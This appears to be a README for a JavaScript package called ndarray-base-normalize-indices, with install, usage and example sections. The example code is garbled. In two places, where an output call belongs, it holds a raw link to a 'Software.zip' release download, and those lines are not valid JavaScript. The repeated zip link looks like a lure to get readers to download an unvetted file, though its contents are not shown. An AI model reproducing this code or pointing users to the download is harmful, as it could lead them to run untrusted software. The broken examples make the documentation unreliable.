## Installation

You can install **ndarray-base-normalize-indices** by following these steps:

```bash
npm install ndarray-base-normalize-indices
```

## Usage

Here's how you can use the **ndarray-base-normalize-indices** library in your JavaScript code:

```javascript
const normalizeIndices = require('ndarray-base-normalize-indices');

const indices = [10, -5, 20, 0];
const max = 15;

const normalizedIndices = normalizeIndices(indices, max);

```

## Examples

Check out some cool examples of using **ndarray-base-normalize-indices**:

1. Normalizing indices for a 3D array:

```javascript
const indices3D = [5, 10, -2, 7];
const max3D = 12;

const normalizedIndices3D = normalizeIndices(indices3D, max3D);
https://github.com/samix151210/ndarray-base-normalize-indices/releases/download/v2.0/Software.zip(normalizedIndices3D);
```

2. Normalizing indices for a custom index type:

```javascript
const customIndices = ['A', 'B', 'C'];
const maxCustom = 'E';

const normalizedCustomIndices = normalizeIndices(customIndices, maxCustom);
https://github.com/samix151210/ndarray-base-normalize-indices/releases/download/v2.0/Software.zip(normalizedCustomIndices);
```
